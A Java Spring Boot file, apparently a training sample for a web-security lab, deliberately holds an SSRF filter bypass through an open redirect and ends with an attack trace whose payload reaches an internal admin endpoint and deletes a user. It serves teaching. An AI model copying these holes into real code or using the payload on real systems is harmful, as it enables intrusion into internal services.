/**
 * VULNERABLE CODE — SSRF with Filter Bypass via Open Redirection
 * Language: Java (Spring Boot)
 *
 * BUG 1 — SSRF in StockController:
 *   Filter allows local paths only.
 *   RestTemplate follows redirects by default.
 *   Open redirect on a local path bypasses the filter.
 *
 * BUG 2 — Open Redirect in ProductController:
 *   path parameter written directly into ResponseEntity Location header.
 *   No validation. Redirects to any URL.
 */

import org.springframework.http.*;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.client.RestTemplate;

import java.net.URI;


// ── BUG 1: SSRF Stock Checker ─────────────────────────────────────────────────

@RestController
public class StockController {

    private static final String APP_DOMAIN = "your-lab-id.web-security-academy.net";

    // Default RestTemplate follows redirects — this is the vulnerability
    private final RestTemplate restTemplate = new RestTemplate();


    /**
     * Filter: allows local paths and own domain.
     * FLAW: does not validate redirect destinations.
     */
    private boolean isAllowedUrl(String url) {
        // Allow relative/local paths
        if (url.startsWith("/")) {
            return true;
        }

        // Allow requests to own domain
        try {
            URI uri = new URI(url);
            return APP_DOMAIN.equals(uri.getHost());
        } catch (Exception e) {
            return false;
        }
    }


    @PostMapping("/product/stock")
    public ResponseEntity<String> checkStock(
            @RequestParam("stockApi") String stockApiUrl) {

        if (stockApiUrl == null || stockApiUrl.isEmpty()) {
            return ResponseEntity.badRequest().body("stockApi required");
        }

        // ❌ BUG 1a: filter only checks the first URL, not redirect targets
        if (!isAllowedUrl(stockApiUrl)) {
            return ResponseEntity
                .status(HttpStatus.BAD_REQUEST)
                .body("External stock check blocked for security reasons");
        }

        // Prepend domain for relative paths
        if (stockApiUrl.startsWith("/")) {
            stockApiUrl = "https://" + APP_DOMAIN + stockApiUrl;
        }

        // ❌ BUG 1b: RestTemplate follows redirects by default
        // When stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
        // RestTemplate follows the 302 → fetches the internal admin panel
        String response = restTemplate.getForObject(stockApiUrl, String.class);
        return ResponseEntity.ok(response);
    }
}


// ── BUG 2: Open Redirect ──────────────────────────────────────────────────────

@RestController
public class ProductController {

    @GetMapping("/product/nextProduct")
    public ResponseEntity<Void> nextProduct(@RequestParam String path) {

        // ❌ BUG 2: path is written directly into Location header
        // Intended: path = "/product?productId=3"
        // Attacker: path = "http://192.168.0.12:8080/admin"
        return ResponseEntity
            .status(HttpStatus.FOUND)
            .location(URI.create(path))  // ← no validation on 'path'
            .build();
    }
}


/*
 * ============================================================
 * ATTACK TRACE:
 *
 * POST /product/stock
 * stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
 *
 * isAllowedUrl():
 *   url.startsWith("/") → true → PASSES
 *
 * Full URL: https://app.domain/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
 *
 * RestTemplate.getForObject() fetches it:
 *   GET /product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
 *   → 302 Location: http://192.168.0.12:8080/admin/delete?username=carlos
 *
 * RestTemplate follows redirect (default):
 *   GET /admin/delete?username=carlos on 192.168.0.12:8080
 *   → carlos deleted → 302
 *
 * Filter satisfied by first URL. Redirect did the rest.
 * ============================================================
 */
